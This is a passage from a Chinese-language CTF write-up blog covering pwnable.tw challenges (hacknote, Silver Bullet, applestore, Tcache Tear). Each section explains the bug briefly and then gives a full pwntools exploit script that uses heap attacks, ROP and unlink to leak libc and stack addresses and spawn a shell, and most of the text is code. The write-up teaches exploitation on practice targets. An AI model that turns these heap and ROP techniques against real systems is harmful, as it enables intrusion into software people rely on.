class="built_in">str</span>(libc_base+bin_sh))</span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.readuntil(<span class="string">&#x27;Result :\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;\t-&gt;  &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27; &#x27;</span>))))</span><br><span class="line"><span class="comment"># 24 -&gt; canary</span></span><br><span class="line"><span class="comment"># 32 -&gt; ret_addr</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>hacknote</h1>
<p>堆的题目，思路是fastbin attack。每一条note存放了一个输出函数的指针和数据的指针(空间在栈上分配)，那个输出的函数怎么看都是故意放上去的，所以很容易可以想到通过fastbin attack改变这个函数指针到system函数然后getshell。</p>
<img src="/p/pwnable-tw-writeup/6-1.png" class="" title="img_6-1">
<p>做fastbin attack时要覆盖note块的话就数据块大小就需要跟note块大小一样(0x10，大概是12bytes以下吧)，但这样会因为偶数的关系做不了fastbin attack，所以有一个trick就是中间分配一个数据块大于0x10的note隔开变成奇数(这样讲有点迷，看wp吧- -)。heap_base可以容易泄漏出来，libc_base的话可以通过把数据的指针写成.got表地址，然后打印note泄漏。</p>
<p>最后system函数调用时栈上的情况如下，所以第一个参数会是输出函数被覆盖成system函数的那个块的地址，这里有一个trick是可以通过构造一个“或”的表达式来绕过，如“xxxx||/bin/sh”，但这里长度只够输“sh”，虽然最后是成功了，但好像还是有点悬。</p>
<img src="/p/pwnable-tw-writeup/6-2.png" class="" title="img_6-2">
<img src="/p/pwnable-tw-writeup/6-3.png" class="" title="img_6-3">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_print</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x804A050</span></span><br><span class="line">puts_fun = <span class="number">0x804862B</span></span><br><span class="line">got_puts = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">do_add(<span class="number">4</span>,<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">do_add(<span class="number">0x16</span>,<span class="string">&#x27;2222/bin/sh\x00&#x27;</span>)</span><br><span class="line">do_delete(<span class="number">0</span>)</span><br><span class="line">do_delete(<span class="number">0</span>)</span><br><span class="line">do_add(<span class="number">4</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">do_print(<span class="number">0</span>)</span><br><span class="line">heap_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [LEAK] heap_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">do_delete(<span class="number">0</span>)</span><br><span class="line">do_delete(<span class="number">1</span>)</span><br><span class="line">do_add(<span class="number">9</span>,p32(puts_fun)+p32(got_puts))</span><br><span class="line">do_print(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#lib_base = u32(r.recv(4)) - 0x5b6a8  # debug</span></span><br><span class="line">lib_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x5f140</span>  <span class="comment"># .</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [LEAK] lib_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(lib_base))</span><br><span class="line"><span class="comment">#lib_system = lib_base + 0x36f38  # debug</span></span><br><span class="line">lib_system = lib_base + <span class="number">0x3a940</span>  <span class="comment"># .</span></span><br><span class="line"></span><br><span class="line">do_add(<span class="number">10</span>,p32(lib_system)+<span class="string">&#x27;||sh\x00&#x27;</span>)  <span class="comment"># &lt;- trick</span></span><br><span class="line">raw_input(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">do_print(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>Silver Bullet</h1>
<p>这题好像是一个游戏，什么鬼升级子弹然后把狼人射死？</p>
<img src="/p/pwnable-tw-writeup/7-1.png" class="" title="img_7-1">
<p>漏洞在于power_up里的strncat函数，根据<a target="_blank" rel="noopener" href="https://zh.cppreference.com/w/c/string/byte/strncat">文档</a>介绍，strncat在复制字符串后会在末尾补\x00，所以就形成了一个字节的溢出。而这里溢出的刚好把power覆盖了(power控制可以继续输入多少的description)，然后就可造成更多的溢出。最后写个ROP就搞定了。(因为这里溢出的还是比较少的，所以可以先做个read来写入较长的ROP，然后leave ret到写入的ROP那里。另外，把power覆盖成很大的值可实现一键秒杀)</p>
<img src="/p/pwnable-tw-writeup/7-2.png" class="" title="img_7-2">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_bullet</span>(<span class="params">desp</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Give me your description of bullet :&#x27;</span>)</span><br><span class="line">    r.sendline(desp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span>(<span class="params">desp</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Give me your another description of bullet :&#x27;</span>)</span><br><span class="line">    r.sendline(desp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Oh ! You win !!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_input = <span class="number">0x80485EB</span></span><br><span class="line">read_got = <span class="number">0x804AFD0</span></span><br><span class="line">read_plt = <span class="number">0x8048490</span></span><br><span class="line">puts_plt = <span class="number">0x80484A8</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x8048459</span></span><br><span class="line">pop_edi_ebp = <span class="number">0x8048a7a</span></span><br><span class="line">pop_ebp = <span class="number">0x8048a7b</span></span><br><span class="line">leave_ret = <span class="number">0x8048558</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804B908</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss -&gt; &#x27;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    puts_plt,pop_ebp,read_got,</span><br><span class="line">    read_input,pop_edi_ebp,bss,<span class="number">0xffffffff</span>,</span><br><span class="line">    pop_ebp,bss-<span class="number">4</span>,leave_ret</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">creat_bullet(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">power_up(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">power_up(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span>+payload)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">lib_base = u32(r.recv(<span class="number">5</span>)[<span class="number">1</span>:]) - <span class="number">0xd41c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] lib_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(lib_base))</span><br><span class="line">lib_system = lib_base+<span class="number">0x3a940</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    lib_system,pop_ebp,bss+<span class="number">4</span>*<span class="number">4</span>,</span><br><span class="line">    <span class="number">0xdeadbeef</span></span><br><span class="line">]))</span><br><span class="line">payload2 += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>applestore</h1>
<p>这题模拟了一个applestore(大雾)，买满7174刀可以用1刀的价格换一台iphone8(而且还是强制的- -)。购物车是个双向链表，结构大概是：</p>
<img src="/p/pwnable-tw-writeup/8-1.png" class="" title="img_8-1">
<p>漏洞点还挺明显的，就在checkout时的这个一刀换购里，送的iphone8是在栈里的，所以相当于有了一个可操控(但有些难用)的栈指针。当时找了很久到找不到在哪可以利用，后来瞄了一下<a target="_blank" rel="noopener" href="http://look3little.blogspot.com/2017/07/writeup-pwnabletw-applestore-200.html">别人的wp</a>后才知道在delete的read可以覆盖这个iphone8的位置。</p>
<img src="/p/pwnable-tw-writeup/8-2.png" class="" title="img_8-2">
<p>所以构造一下假的chunk，通过覆盖name的位置为想读信息的地址可以实现任意读(next和last写成0，不然会crash)，本来打算栈地址可以通过tls得到的，但发现服务器的tls地址跟我本地的不一样…，后来才知道libc里面是放着environ的，通过environ可以得到栈的地址。</p>
<p>写的话可以通过delete里的unlink来写，学到了新的方法——通过unlink覆盖ebp。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Device Number&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Item Number&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 299*20 + 199*6 = 7174</span></span><br><span class="line"><span class="keyword">for</span> _i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> _i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x804B00C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak lib_base</span></span><br><span class="line">fake_node = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    read_got,<span class="number">0xdeadbeef</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">]))</span><br><span class="line">remove(<span class="string">&#x27;27&#x27;</span>+fake_node+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Remove 27:&#x27;</span>)</span><br><span class="line">lib_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xd41c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] lib_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(lib_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_base</span></span><br><span class="line">cart = <span class="number">0x804B070</span></span><br><span class="line">fake_node = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    cart,<span class="number">0xdeadbeef</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">]))</span><br><span class="line">remove(<span class="string">&#x27;27&#x27;</span>+fake_node+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Remove 27:&#x27;</span>)</span><br><span class="line">heap_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x410</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] heap_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack_base</span></span><br><span class="line">environ = lib_base + <span class="number">0x1b1dbc</span>  <span class="comment"># trick ...</span></span><br><span class="line">fake_node = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    environ,<span class="number">0xdeadbeef</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">]))</span><br><span class="line">remove(<span class="string">&#x27;27&#x27;</span>+fake_node+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Remove 27:&#x27;</span>)</span><br><span class="line">lib_environ = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] lib_environ -&gt; &#x27;</span>+<span class="built_in">hex</span>(lib_environ))</span><br><span class="line"></span><br><span class="line">stack_base = lib_environ - <span class="number">0x78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] stack_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> unlink</span></span><br><span class="line">atoi_got = <span class="number">0x804B040</span></span><br><span class="line">del_ebp = stack_base - <span class="number">0x8c</span></span><br><span class="line">hand_ebp = stack_base - <span class="number">0x4c</span></span><br><span class="line">nptr = stack_base - <span class="number">0x6e</span></span><br><span class="line">fake_node = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    cart,<span class="number">0xdeadbeef</span>,nptr+<span class="number">2</span>-<span class="number">4</span>,hand_ebp-<span class="number">0x4</span>*<span class="number">2</span></span><br><span class="line">]))</span><br><span class="line">remove(<span class="string">&#x27;27&#x27;</span>+fake_node+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hack</span></span><br><span class="line">lib_system = lib_base + <span class="number">0x3a940</span></span><br><span class="line">pop_ebp = <span class="number">0x8048b39</span></span><br><span class="line">payload = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    lib_system,pop_ebp,nptr+<span class="number">14</span></span><br><span class="line">]))</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;6\x00&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>Tcache Tear</h1>
<p>给的库是2.27的，根据题目名知道应该是tcache方面的漏洞(堆题)，题目逻辑挺简单的就不贴IDA了。<br>
首先贴一下<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4102">Tcache</a>有关的教程(我认为比较全的)。</p>
<p>这题有个比较难搞的是&quot;Info&quot;那里只能输出开始时输入的&quot;Name&quot;位置的0x20个字符(.bss)，这里可以先在填Name时制造一个0x420的fake_chunk(分配到unsorted bin的大小)，通过两次free把tcache的fd指到name里，然后free掉刚制造的fake_chunk，因为要解决unlink时错误的问题，还要把free的chunk的邻近的chunk也假造一下(具体看exp)</p>
<p>另外制造假chunk时还要用到一个漏洞，在malloc里的输入大小是&quot;size - 16&quot;，存在一个整数溢出，当size小于16时就可以输入任意大小了。free unsorted bin的chunk后可以通过Info泄漏libc的base。</p>
<img src="/p/pwnable-tw-writeup/9-1.png" class="" title="img_9-1">
<p>然后本来是打算覆写atoll的got地址的，后来卡了很久才发现是&quot;Full RELRO&quot; - -，那就只能写malloc_hook或者free_hook了，malloc_hook的话因为one gadget条件不行就弃用了，free_hook刚好有一个符合的，然后就getshell了。</p>
<img src="/p/pwnable-tw-writeup/9-2.png" class="" title="img_9-2">
<img src="/p/pwnable-tw-writeup/9-3.png" class="" title="img_9-3">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10207</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">nm</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">    r.sendline(nm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x602060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name_addr -&gt; &#x27;</span>+<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line">setName(p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line">sz = <span class="number">8</span></span><br><span class="line">malloc(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">malloc(sz,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(sz,p64(name+<span class="number">0x10</span>))</span><br><span class="line">malloc(sz,p64(name+<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># 0x420 -&gt; unsorted bin size</span></span><br><span class="line">malloc(sz,<span class="string">&#x27;hacked\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(name+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">126</span>+</span><br><span class="line">       p64(<span class="number">0x420</span>)+p64(<span class="number">0x421</span>)+p64(<span class="number">0</span>)*<span class="number">130</span>+  <span class="comment"># deal unlink ...</span></span><br><span class="line">       p64(<span class="number">0x420</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;!\x04\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">0x3ebca0</span>  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK]libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base+<span class="number">0x3ebc30</span>  </span><br><span class="line">free_hook = libc_base+<span class="number">0x3ed8e8</span>  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook -&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span>  </span><br><span class="line">malloc(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>)</span><br><span 